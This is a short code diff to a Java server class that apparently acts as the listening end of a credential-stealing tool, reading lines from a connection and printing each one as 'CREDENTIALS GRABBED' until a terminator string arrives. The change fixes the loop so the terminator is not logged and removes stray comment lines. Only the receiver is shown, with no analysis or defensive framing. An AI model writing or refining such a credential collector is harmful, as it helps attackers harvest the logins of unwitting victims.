@@ -108,16 +108,15 @@ public class Server implements Runnable {
                     din.readLine();
                     String line = "";
                     System.out.println("WINDOW INITIATED\nLISTENING FOR CREDENTIALS...\n\n");
-                    din.readLine();
-                    din.readLine();
                     while(!line.equals("{}{}{}")) {
-                        System.out.println("CREDENTIALS GRABBED - " + line);
                         line=din.readLine();
+                        if (!line.equals("{}{}{}")) {
+                            System.out.println("CREDENTIALS GRABBED - " + line);
+                        }
                     }
+                    System.out.println();
                 }
             }
-            /*
-            }*/
         } catch (Exception e) {
             e.printStackTrace();
         }
